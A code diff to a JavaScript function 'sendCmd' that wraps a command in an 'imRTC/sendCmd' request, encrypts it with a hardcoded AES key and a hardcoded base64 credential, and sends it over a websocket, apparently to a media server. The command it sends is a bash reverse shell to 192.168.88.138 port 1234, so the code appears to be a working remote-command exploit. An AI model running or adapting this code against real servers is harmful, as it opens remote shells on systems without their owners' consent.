@@ -216,25 +216,31 @@ async function sendCmd() {
     await connect();
 
     let cmd = 'setsid bash -i >& /dev/tcp/192.168.88.138/1234 0<&1 &';
+    obj = {
+        route:'imRTC/sendCmd',
+        req_data:{
+            cmd:cmd,
+            auth:'bWVkaWFzZXJ2ZXI6MTIz'
+        }
+    }
+    let data = JSON.stringify(obj);
+
     let key = 'mediaserver12345';
     key = CryptoJS.enc.Utf8.parse(key);
     let options = {
         mode: CryptoJS.mode.ECB,
         padding: CryptoJS.pad.Pkcs7
     };
-    let encrypted = CryptoJS.AES.encrypt(cmd, key, options);
+    let encrypted = CryptoJS.AES.encrypt(data, key, options);
     // console.log('Client::sendCmd(), encrypted:', encrypted.toString());
     let encrypted_base64 = encrypted.ciphertext.toString(CryptoJS.enc.Base64);
     // console.log('Client::sendCmd(), encrypted_base64:', encrypted_base64);
 
-    obj = {
-        route:'imRTC/sendCmd',
-        req_data:{
-            cmd:encrypted_base64,
-            auth:'bWVkaWFzZXJ2ZXI6MTIz'
-        }
+    console.log('Client.send(), ' + encrypted_base64);
+    if( client.readyState == client.OPEN ) {
+        $("[id=jsonSend]").html(encrypted_base64);
+        client.send(encrypted_base64);
     }
-    send(obj);
 }
 
 async function call() {
